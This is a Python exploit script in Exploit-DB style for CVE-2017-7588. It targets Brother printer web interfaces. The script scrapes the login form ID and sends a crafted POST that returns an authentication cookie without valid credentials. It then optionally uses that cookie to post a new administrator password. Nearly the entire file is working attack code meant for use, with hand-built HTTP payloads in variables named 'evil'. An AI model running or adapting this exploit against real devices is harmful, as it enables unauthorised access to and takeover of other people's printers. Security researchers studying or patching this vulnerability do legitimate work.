#!/usr/bin/python

# Exploit Title: Brother printer login bypass/password change
# Date: 09-10-2017
# Original Discovery By: Patryk Bogdan (@patryk_bogdan)
# Original Exploit: https://www.exploit-db.com/exploits/41863/
# Authors: z00n (@0xz00n), ch3rn0byl (@ch3rn0byl)
# Vendor Homepage: http://www.brother-usa.com/
# Affected Models: All consumer models with login button at top of page that don't have CSRF token
# CVE: CVE-2017-7588

from bs4 import BeautifulSoup
import requests
import socket
import urllib
import sys

# Initialize a couple vars
loginid = ""
cookie = ""

# Gather target info
while True:
    target = raw_input("[*] Enter target IP or hostname: ")
    if len(target) > 0:
        while True:
            port = raw_input("[*] Enter target port: ")
            if len(port) >0:
                break
            else:
                print "[!] Please enter a target port"
        break
    else:
        print "[!] Please enter a target IP or hostname"

# Load page and search for identifiers, fail and exit if identifiers are not found
try:
    if port == "443":
        page = requests.get("https://" + target + ":" + port + "/general/status.html")
    else:
        page = requests.get("http://" + target + ":" + port + "/general/status.html")
    soup = BeautifulSoup(page.content,"lxml")
    form = soup.find(id="LogBox")
    loginid = form.get('name')
    print "[*] Login form ID found: %s" % loginid
    printer = soup.title.string
    if ("Brother" in printer) or ("MFP" in printer):
        print "[*] Printer model: %s" % printer
    else:
        print "[!] Printer does not appear to be manufactured by Brother"
except:
    print "[!] Login form ID not found, is the target vulnerable?"
    sys.exit()

# Payload to grab AuthCookie
evil = "POST /general/status.html HTTP/1.1\r\n"
evil += "Host: " + target + "\r\n"
evil += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-US,en;q=0.5\r\n"
evil += "Referer: http://" + target + "/general/status.html\r\n"
evil += "Connection: close\r\n"
evil += "Upgrade-Insecure-Requests: 1\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 42\r\n"
evil += "\r\n"
evil += loginid + "=asd&loginurl=%2Fgeneral%2Fstatus.html\r\n\r\n"

# Initialize socket, connect to target, and send payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print "[*] Connecting to %s" % target
    s.connect((target,int(port)))
    print "[*] Sending payload"
    s.send(evil)
    print "[*] Payload sent"
    reply = s.recv(4096)
    s.close()
except:
    print "[!] Could not connect to target on port %s" % port

# Search server response for AuthCookie
print "[*] Searching server response"
for line in reply.split(' '):
    if "AuthCookie" in line:
        cookie = line[:-1]

# If cookie var was populated continue, else fail
if len(cookie) == 0:
    print "[!] Failed to find AuthCookie, %s is not vulnerable." % target
    sys.exit()
else:
    print "[!] Cookie found!"

# Ask whether or not user wants to change password
while True:
    usercheck = raw_input("[*] Do you want to change the password? [y/n]: ")
    if usercheck == "y" or usercheck == "Y":
        while True:
            # If user wants to change password, meet requirements, then URL encode password
            passwd = raw_input("[*] Enter desired password: ")
            if len(passwd) == 0:
                print "[!] Please enter a password"
            elif len(passwd) > 33:
                print "[!] Password must not exceed 33 characters"
            else:
                print "[*] URL encoding password"
                newpass = urllib.quote(passwd)
                break
        break
    # If answer was n, provide AuthCookie and exit
    elif usercheck == "n" or usercheck == "N":
        print "[!] Create a cookie with the following information to bypass login:\n%s" % cookie
        sys.exit()
    else:
        print "[!] Please choose either y or n"

# Gather password form ID to populate payload
if port == "443":
    page = requests.get("https://" + target + "/admin/password.html",headers ={'Cookie':cookie})
else:
    page = requests.get("http://" + target + "/admin/password.html",headers ={'Cookie':cookie})
soup = BeautifulSoup(page.content,"lxml")
form = soup.find("input",{'type':'password'})
passid = form.get('id')
print "[*] Password change form ID found: %s" % passid

# Find length of POST data to populate Content-Length
rlength = len(passid + "=" + newpass + "&temp_retypePass=" + newpass)

# Password change payload
evil = "POST /admin/password.html HTTP/1.1\r\n"
evil += "Host: " + target + "\r\n"
evil += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-US,en;q=0.5\r\n"
evil += "Referer: http://" + target + "/admin/password.html\r\n"
evil += "Cookie: " + cookie + "\r\n"
evil += "Connection: close\r\n"
evil += "Upgrade-Insecure-Requests: 1\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: " + str(rlength) + "\r\n"
evil += "\r\n"
evil += passid + "=" + newpass + "&temp_retypePass=" + newpass + "\r\n\r\n"

# Re-initialize socket, connect to target, and send payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print "[*] Connecting to %s" % target
    s.connect((target,int(port)))
    print "[*] Sending password change payload"
    s.send(evil)
    print "[*] Payload sent"
    reply = s.recv(4096)
except:
    print "[!] Could not connect to target on port %s" % port

# Search server response for new cookie
print "[*] Searching server response"
for line in reply.split(' '):
    if "AuthCookie" in line:
        if line[:-1] == cookie:
            print "[!] Cookies match, password change either failed or new password was same as old password"
        else:
            print "[!] Password change successful!"
            print line[:-1]
